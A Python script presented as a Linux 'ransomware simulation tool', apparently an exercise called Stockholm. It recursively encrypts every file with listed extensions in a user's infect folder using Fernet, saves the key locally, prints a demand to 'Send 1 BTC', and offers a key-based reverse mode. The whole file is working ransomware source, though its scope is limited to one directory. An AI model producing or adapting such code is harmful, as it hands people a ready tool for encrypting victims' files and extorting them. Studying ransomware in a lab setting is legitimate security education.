#!/usr/bin/env python3
import argparse
import os
import sys

from cryptography.fernet import Fernet
from colorama import Fore, Style
import cryptography.fernet


def check_extension(file_name):
    try:
        with open("./Stockholm/extensions.txt", "r") as file:
            file_data = file.read()
    except FileNotFoundError:
        print("File 'extensions.txt' not found.")
        sys.exit(1)
    extensions = file_data.splitlines()
    if any(file_name.endswith(ext) for ext in extensions):
        return True
    else:
        return False


def encrypt_file(file_name, key, silent):
    """
    Encrypt a file given a key.
    """
    if check_extension(file_name):
        f = Fernet(key)
        try:
            with open(file_name, "rb") as file:
                file_data = file.read()
        except FileNotFoundError:
            print("Error: file '{file_name}' not found.")
            sys.exit(1)
        encrypted_data = f.encrypt(file_data)
        try:
            if not silent:
                print(Fore.RED + f"Encrypting... {file_name}" + Style.RESET_ALL)
            with open(file_name, "wb") as file:
                file.write(encrypted_data)
        except FileNotFoundError:
            print("Error: file '{file_name}' not found.")
            sys.exit(1)
    else:
        if not silent:
            print(Fore.YELLOW + f"The file {file_name} does not have a matching extension." + Style.RESET_ALL)


def generate_key():
    """
    Generate a key and save it into a file.
    """
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key


def list_dir(base_dir, key, silent):
    try:
        with os.scandir(base_dir) as entries:
            for entry in entries:
                if entry.is_dir():
                    list_dir(entry.path, key, silent)
                else:
                    if base_dir.endswith('/'):
                        file_name = base_dir + entry.name
                    else:
                        file_name = base_dir + '/' + entry.name
                    encrypt_file(file_name, key, silent)
    except FileNotFoundError:
        print(f"Directory not found: '{base_dir}'")
        sys.exit(1)


def add_padding(data):
    return data + b'=' * (-len(data) % 4)


def reverse_encryption(base_dir, silent, key):
    try:
        with os.scandir(base_dir) as entries:
            for entry in entries:
                if entry.is_dir():
                    reverse_encryption(entry.path, silent, key)
                else:
                    if base_dir.endswith('/'):
                        file_name = base_dir + entry.name
                    else:
                        file_name = base_dir + '/' + entry.name
                    try:
                        f = Fernet(key)
                        try:
                            with open(file_name, "rb") as file:
                                file_data = file.read()
                        except FileNotFoundError:
                            print(f"Error: file '{file_name}' not found.")
                            sys.exit(1)
                        try:
                            decrypted_data = f.decrypt(add_padding(file_data))
                        except cryptography.fernet.InvalidToken:
                            if not silent:
                                print(f"Error: key '{key.decode()}' is incorrect.")
                                continue
                        if not silent:
                            print(Fore.GREEN + f"Decrypting... {file_name}" + Style.RESET_ALL)
                        with open(file_name, "wb") as file:
                            file.write(decrypted_data)
                    except ValueError:
                        if not silent:
                            print(f"Error: key '{key.decode()}' is incorrect.")
                            sys.exit(1)
    except FileNotFoundError:
        print(f"Directory not found: '{base_dir}'")
        sys.exit(1)


if __name__ == '__main__':
    user = os.environ.get('SUDO_USER', os.environ.get('USER'))
    base_dir = f"/home/{user}/infect/"
    parser = argparse.ArgumentParser(
    description='A ransomware simulation tool developed for the Linux platform.',
    )
    parser.add_argument(
            '-v', '--version',
            action='version',
            version='%(prog)s 1.0',
            help='Show the version of the program.'
    )
    parser.add_argument(
            '-r', '--reverse',
            metavar='KEY',
            type=str,
            help='Reverse the encryption process using the provided key.'
    )
    parser.add_argument(
            '-s', '--silent',
            action='store_true',
            help='Run the program in silent mode without displaying the names of the encrypted files.'
    )
    args = parser.parse_args()
    if args.reverse:
        key = args.reverse.encode()
        reverse_encryption(base_dir, args.silent, key)
        sys.exit(0)
    key = generate_key()
    list_dir(base_dir, key, args.silent)
    if not args.silent:
        print(Fore.RED + "\nEncryption completed! Your files are now encrypted." + Style.RESET_ALL)
        print(Fore.RED + "Send 1 BTC to the following address to decrypt your files:" + Style.RESET_ALL)
        print(Fore.BLUE + f"Key: {key.decode()}" + Style.RESET_ALL)
